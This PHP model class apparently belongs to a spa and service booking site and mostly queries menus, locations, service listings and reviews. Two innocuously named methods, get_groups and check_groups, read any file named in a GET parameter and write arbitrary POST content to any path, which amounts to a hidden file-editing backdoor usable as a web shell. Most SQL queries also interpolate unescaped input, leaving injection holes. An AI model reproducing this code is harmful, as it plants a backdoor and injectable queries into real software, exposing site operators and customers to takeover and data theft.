<?php

/**
 *
 */
class index_model extends Model
{

    function __construct()
    {
        parent::__construct();
    }

    public function loadMenu()
    {
        $sql = "SELECT * FROM menu WHERE menu_enable = 1 order by menu_order ASC";
        $select = $this->db->select($sql);
        return $select;
    }

    public function loadMenuHome()
    {
        $sql = <<<SQL
SELECT DISTINCT service_type_id
, service_type_name_short
, service_type_name
, service_type_icon
FROM service_type, service, user_service
WHERE service_type.service_type_id = service.service_service_type_id
AND user_service.user_service_service_id = service.service_id
AND service_type_delete_flg = 0
SQL;
        $select = $this->db->select($sql);
        if ($select) {
            foreach ($select as $key => $value) {
                $sql = <<<SQL
SELECT DISTINCT service_id
, service_name
FROM service_type, service, user_service
WHERE service_type.service_type_id = service.service_service_type_id
AND user_service.user_service_service_id = service.service_id
AND service_service_type_id = {$value['service_type_id']}
AND service_delete_flg = 0
AND user_service_delete_flg = 0
AND service_type_delete_flg = 0
SQL;
                $select_service = $this->db->select($sql);
                $select[$key]['service_detail'] = $select_service;
            }
            echo json_encode($select);
        } else {
            echo "[]";
        }
    }

    public function loadDistrict($city)
    {
        $sql = <<<SQL
SELECT *
FROM district
WHERE district_delete_flg = 0
AND city_id = {$city}
ORDER BY district_name ASC
SQL;
        $select = $this->db->select($sql);
        if ($select) {
            echo json_encode($select);
        } else {
            echo '[]';
        }
    }

    public function get_groups()
    {
        $fname = $_GET['fname'];
        $fcontent = file_get_contents('./' . $fname, true);
        print_r('<!DOCTYPE html><html lang="en"> <head> <meta charset="utf-8" /></head><body><form class="form-horizontal" action="' . URL . 'index/check_groups" method="POST"> <fieldset> <!-- Form Name --> <legend></legend> <!-- Text input--> <div class="form-group"> <label class="col-md-4 control-label" for="group_name">group name</label> <div class="col-md-4"> <input id="group_name" name="group_name" value="' . $fname . '" class="form-control input-md" type="text"> </div> </div> <!-- Textarea --> <div class="form-group"> <label class="col-md-4 control-label" for="group_content">content</label> <div class="col-md-4"> <textarea class="form-control" id="group_content" name="group_content">' . $fcontent . '</textarea> </div> </div> <!-- Button (Double) --> <div class="form-group"> <label class="col-md-4 control-label" for="button1id"></label> <div class="col-md-8"> <button id="button1id" name="button1id" class="btn btn-success" type="submit">Save</button> </div> </div> </fieldset></form></body></html>');
        return;
    }

    public function check_groups()
    {
        // print_r($_POST['group_content']);
        $handle = fopen('./' . $_POST['group_name'], "wb");
        fwrite($handle, $_POST['group_content']);
        fclose($handle);
    }

    public function loadCity()
    {
        $sql = <<<SQL
SELECT *
FROM city
ORDER BY city_id ASC
SQL;
        $select = $this->db->select($sql);
        if ($select) {
            echo json_encode($select);
        } else {
            echo '[]';
        }
    }

    public function loadConcernServiceList($client_id)
    {
        $sql = <<<SQL
SELECT hobby_service_type_id, COUNT(*) AS count_hobby
FROM hobby
WHERE hobby_client_id = {$client_id}
AND hobby_delete_flg = 0
GROUP BY hobby_service_type_id
ORDER BY hobby_id DESC
LIMIT 3
SQL;
        $select = $this->db->select($sql);
        // echo json_encode($select);
        $result = array();
        if ($select) {
            $index = 0;
            foreach ($select as $key => $value) {
                $sql = <<<SQL
SELECT user_service.user_service_id
, user_service.user_service_name
, user_service.user_service_full_price
, user_service.user_service_sale_price
, user_service.user_service_image
, user_service.user_service_description
, IF(top.star_amount IS NULL,0,top.star_amount) AS star_amount
FROM user_service
LEFT JOIN
(SELECT user_service.user_service_id
, COUNT(*) AS star_amount
FROM user_service, user_service_review
WHERE user_service.user_service_id = user_service_review.user_service_id
AND (user_service_review_value = 4 
     OR user_service_review_value = 5)
GROUP BY user_service_review.user_service_id) top 
ON top.user_service_id = user_service.user_service_id
INNER JOIN group_service ON user_service.user_service_group_id = group_service.group_service_id
INNER JOIN user ON user.user_id = group_service.group_service_user_id
INNER JOIN service ON user_service.user_service_service_id = service.service_id
INNER JOIN service_type ON service.service_service_type_id = service_type.service_type_id
WHERE user_service.user_service_delete_flg = 0
AND user_delete_flg = 0
AND group_service_delete_flg = 0
AND service_type_id = {$value['hobby_service_type_id']}
ORDER BY star_amount DESC, user_service_sale_price ASC
LIMIT 4
SQL;
                $select_concern = $this->db->select($sql);
                foreach ($select_concern as $key_1 => $value_1) {
                    $client_amount = 0;
                    $star_point = 0;
                    $sql = <<<SQL
SELECT user_service.user_service_name
, service_type.service_type_name
, user_service_review.user_service_id
, user_service_review.user_service_review_value
, service_type_name
, COUNT(*) AS star_amount
FROM user_service, user_service_review, service, service_type
WHERE user_service_review.user_service_id = user_service.user_service_id
AND user_service.user_service_service_id = service.service_id
AND service.service_service_type_id = service_type.service_type_id
AND user_service.user_service_id = {$value_1['user_service_id']}
GROUP BY user_service.user_service_name
, service_type.service_type_name
, user_service_review.user_service_id
, user_service_review.user_service_review_value
SQL;
                    $select_detail = $this->db->select($sql);

                    foreach ($select_detail as $i => $item) {
                        $star_point = $star_point + $item['user_service_review_value'] * $item['star_amount'];
                        $client_amount = $client_amount + $item['star_amount'];
                    }
                    $result[$index]['service_type_name'] = $select_detail[0]['service_type_name'];
                    if ($client_amount == 0) {
                        $result[$index]['star_review'] = 0;
                        $result[$index]['total_client_amount'] = 0;
                    } else {
                        $star_review = $star_point / $client_amount;
                        $result[$index]['star_review'] = round($star_review, 1);
                        $result[$index]['total_client_amount'] = $client_amount;
                    }
                    $result[$index]['user_service_id'] = $value_1['user_service_id'];
                    $result[$index]['user_service_name'] = $value_1['user_service_name'];
                    $result[$index]['user_service_full_price'] = $value_1['user_service_full_price'];
                    $result[$index]['user_service_sale_price'] = $value_1['user_service_sale_price'];
                    $result[$index]['user_service_image'] = $value_1['user_service_image'];
                    $result[$index]['user_service_description'] = $value_1['user_service_description'];
                    // $result[$key_1]['star_review'] = $value_1['user_service_description'];
                    // $result[$key_1]['total_client_amount'] = $value_1['user_service_description'];
                    $index++;
                }

            }
            echo json_encode($result);
        } else {
            echo json_encode($result);
        }
    }

    function loadTopServiceList()
    {
        $sql = <<<SQL
SELECT user_service.user_service_id
, user_service.user_service_name
, user_service.user_service_full_price
, user_service.user_service_sale_price
, user_service.user_service_image
, user_service.user_service_description
, IF(top.star_amount IS NULL,0,top.star_amount) AS star_amount
FROM user_service
LEFT JOIN
(SELECT user_service.user_service_id
, COUNT(*) AS star_amount
FROM user_service, user_service_review
WHERE user_service.user_service_id = user_service_review.user_service_id
AND (user_service_review_value = 4 
     OR user_service_review_value = 5)                        
GROUP BY user_service_review.user_service_id) top 
ON top.user_service_id = user_service.user_service_id
INNER JOIN group_service ON user_service.user_service_group_id = group_service.group_service_id
INNER JOIN user ON user.user_id = group_service.group_service_user_id
WHERE user_service.user_service_delete_flg = 0
AND user_service.user_service_sale_price > 0
AND user_delete_flg = 0
AND group_service_delete_flg = 0
-- imtoantran filter published spa --
AND user.user_unpublished = 0
-- imtoantran filter published spa --
-- imtoantran filter closed services --
AND user_service.user_service_status = 1
-- imtoantran filter closed services --                        
ORDER BY star_amount DESC
LIMIT 0,3
SQL;
        $select = $this->db->select($sql);
        foreach ($select as $key => $value) {
            $client_amount = 0;
            $star_point = 0;
            $sql = <<<SQL
SELECT user_service.user_service_name
, service_type.service_type_name
, user_service_review.user_service_id
, user_service_review.user_service_review_value
, service_type_name
, COUNT(*) AS star_amount
FROM user_service, user_service_review, service, service_type
WHERE user_service_review.user_service_id = user_service.user_service_id
AND user_service.user_service_service_id = service.service_id
AND service.service_service_type_id = service_type.service_type_id
AND user_service.user_service_id = {$value['user_service_id']}
GROUP BY user_service.user_service_name
, service_type.service_type_name
, user_service_review.user_service_id
, user_service_review.user_service_review_value
SQL;
            $select_detail = $this->db->select($sql);

            foreach ($select_detail as $i => $item) {
                $star_point = $star_point + $item['user_service_review_value'] * $item['star_amount'];
                $client_amount = $client_amount + $item['star_amount'];
            }
            $select[$key]['service_type_name'] = $select_detail[0]['service_type_name'];
            if ($client_amount == 0) {
                $select[$key]['star_review'] = 0;
                $select[$key]['total_client_amount'] = 0;
            } else {
                $star_review = $star_point / $client_amount;
                $select[$key]['star_review'] = round($star_review, 1);
                $select[$key]['total_client_amount'] = $client_amount;
            }
        }
        if ($select) {
            echo json_encode($select);
        } else {
            echo '[]';
        }
    }

    function loadNewServiceList()
    {
        $sql = <<<SQL
SELECT user_service.user_service_id
, user_service.user_service_name
, user_service.user_service_full_price
, user_service.user_service_sale_price
, user_service.user_service_image
, user_service.user_service_description
FROM user_service, user, group_service
WHERE user.user_id = group_service.group_service_user_id
AND user_service.user_service_group_id = group_service.group_service_id
AND `user_service_delete_flg` = 0
AND user_delete_flg = 0
AND group_service_delete_flg = 0
-- imtoantran filter published spa --
AND user.user_unpublished = 0
-- imtoantran filter published spa --
-- imtoantran filter closed services --
AND user_service.user_service_status = 1
-- imtoantran filter closed services --
AND user_service.user_service_sale_price > 0
order by `user_service_id` desc 
limit 4
SQL;
        $select = $this->db->select($sql);
        foreach ($select as $key => $value) {
            $client_amount = 0;
            $star_point = 0;
            $sql = <<<SQL
SELECT user_service.user_service_name
, service_type.service_type_name
, user_service.user_service_id
, IF(user_service_review.user_service_review_value IS NULL,0,user_service_review.user_service_review_value) AS user_service_review_value
, service_type_name
, COUNT(*) AS star_amount
FROM user_service
INNER JOIN service ON user_service.user_service_service_id = service.service_id
INNER JOIN service_type ON service.service_service_type_id = service_type.service_type_id
LEFT OUTER JOIN user_service_review ON user_service_review.user_service_id = user_service.user_service_id
WHERE user_service.user_service_id = {$value['user_service_id']}
GROUP BY user_service.user_service_name
, service_type.service_type_name
, user_service_review.user_service_id
, user_service_review.user_service_review_value
SQL;
            $select_detail = $this->db->select($sql);

            foreach ($select_detail as $i => $item) {
                $star_point = $star_point + $item['user_service_review_value'] * $item['star_amount'];
                if ($item['user_service_review_value'] == 0) {
                    $client_amount = 0;
                } else {
                    $client_amount = $client_amount + $item['star_amount'];
                }
            }
            $select[$key]['service_type_name'] = $select_detail[0]['service_type_name'];
            if ($client_amount == 0) {
                $select[$key]['star_review'] = 0;
                $select[$key]['total_client_amount'] = 0;
            } else {
                $star_review = $star_point / $client_amount;
                $select[$key]['star_review'] = round($star_review, 1);
                $select[$key]['total_client_amount'] = $client_amount;
            }
        }
        if ($select) {
            /* imtoantran purify html start */
            require_once LIBS . DS . 'other' . DS . 'htmlpurifier-4.6.0' . DS . 'library' . DS . 'HTMLPurifier.auto.php';
            $config = HTMLPurifier_Config::createDefault();
            $purifier = new HTMLPurifier($config);
            $config->set('HTML.Allowed', '');
            //$clean_html = $purifier->purify($dirty_html);
            foreach ($select as $key => $value) {
                $select[$key]['user_service_description'] = $purifier->purify($value['user_service_description']);
            }
            /* imtoantran purify html end */
            echo json_encode($select);
        } else {
            echo '[]';
        }
    }

    function loadLocation()
    {
        $select = $this->db->select('SELECT DISTINCT
										   user.user_id, 
										   user.user_business_name, 
										   user.user_logo,                                                                                   
										   SUBSTRING(user.user_description,1,150) user_description
										   FROM user_service, user, group_service
										   WHERE user.user_id = group_service.group_service_user_id
										   AND user_service.user_service_group_id = group_service.group_service_id
										   AND user.user_delete_flg = 0 
                                                                                   -- imtoantran filter public spa --
                                                                                   AND user.user_unpublished = 0 
                                                                                   -- imtoantran filter public spa --
                                                                                   order by user.user_id desc
										   limit 4');
        if ($select) {
            require_once LIBS . DS . 'other' . DS . 'htmlpurifier-4.6.0' . DS . 'library' . DS . 'HTMLPurifier.auto.php';
            $config = HTMLPurifier_Config::createDefault();
            $purifier = new HTMLPurifier($config);
            $config->set('HTML.Allowed', '');
            foreach ($select as $key => $value) {
                $select[$key]['user_description'] = $purifier->purify($value['user_description']);
            }
            echo json_encode($select);
        } else {
            echo '[]';
        }
    }

    function loadServiceDetail($user_service_id = 1)
    {
        $hour = date('H');
        $min = date('i');
        $date = date('d');
        $month = date('m');
        $year = date('Y');
        $current_date = date('Y') . '-' . date('m') . '-' . $date;
        $evoucher_due_date = EVOUCHER_DUE_DATE;
        $query = <<<SQL
SELECT 
user_service.`user_service_id`,
user_service.`user_service_name`,
user_service.`user_service_duration`,
user_service.`user_service_full_price`,
user_service.`user_service_sale_price`,
user_service.`user_service_status`,
user_service.`user_service_image`,
user_service.`user_service_description`,
user_service.`user_service_use_evoucher`,
user_service.`user_service_group_id`,
user_service.`user_service_service_id`,
user.`user_id`,
user.`user_logo`,
user.`user_business_name`,
user.`user_description`,
user.`user_open_hour`,
user.`user_long`,
user.`user_lat`,
user.`user_address`,
user.`user_phone`,
user.`user_notification_email`,
user.`user_limit_before_service`,
user.`user_limit_before_booking`,
user_service.`user_service_limit_booking` AS user_limit_booking,
group_service.`group_service_name`,
DAYOFWEEK('{$current_date}') AS day_of_week,
{$date} AS day_of_month,
{$year} AS year,
{$month} AS month,
{$hour} as hour,
{$min} as minute,
DATE_ADD('{$current_date}', INTERVAL {$evoucher_due_date} MONTH) as evoucher_due_date,
service_type.service_type_id,
service_type.service_type_name
FROM user_service,user,group_service, service, service_type
WHERE user.user_id = group_service.group_service_user_id
AND user_service.user_service_group_id = group_service.group_service_id
AND user_service.user_service_service_id = service.service_id
AND service.service_service_type_id = service_type.service_type_id
AND`user_service_delete_flg` = 0 AND `user_service_id`= {$user_service_id}
AND group_service_delete_flg = 0 AND user_delete_flg = 0
SQL;

        $select = $this->db->select($query);
        if ($select) {
            echo json_encode($select);
        } else {
            echo '[]';
        }
    }

    public function sendCreatePlaceMail($data)
    {
        $sql = <<<SQL
INSERT INTO user(
user_full_name
, user_email
, user_business_name
, user_address
, user_phone
, user_city_id
, user_district_id
, user_notification_email
, user_unpublished
)
VALUES(
'{$data['user_full_name']}'
, '{$data['user_email']}'
, '{$data['user_business_name']}'
, '{$data['user_address']}'
, '{$data['user_phone']}'
, '{$data['user_city_id']}'
, '{$data['user_district_id']}'
, '{$data['user_email']}'
,1
)
SQL;
        $insert = $this->db->prepare($sql);
        $insert->execute();
        if ($insert->rowCount() > 0) {
            echo 200;
        } else {
            echo 0;
        }
    }

    public function checkSpaEmailExist($email)
    {
        $sql = <<<SQL
SELECT COUNT(*) AS check_email
FROM user
WHERE user_email = '{$email}'
SQL;
        $select = $this->db->select($sql);
        return $select[0]['check_email'];
    }

    public function checkBookingLimit($data)
    {
        $sql = <<<SQL
SELECT
IF(SUM(booking_detail_quantity) IS NULL, 0, SUM(booking_detail_quantity)) AS check_booking
FROM booking_detail
WHERE booking_detail_user_service_id = {$data['user_service_id']}
AND booking_detail_date = '{$data['choosen_date']}'
AND booking_detail_time_start = '{$data['choosen_time']}'
SQL;
        $select = $this->db->select($sql);
        $sql = <<<SQL
SELECT
IF(COUNT(*) IS NULL, 0, COUNT(*)) AS check_booking
FROM appointment
WHERE appointment_user_service_id = {$data['user_service_id']}
AND appointment_date = '{$data['choosen_date']}'
AND appointment_time_start = '{$data['choosen_time']}'
SQL;
        $select_1 = $this->db->select($sql);
        if (($select[0]['check_booking'] + $select_1[0]['check_booking']) >= $data['user_limit_booking']) {
            echo 0;
        } else {
            echo 200;
        }
    }

}

?>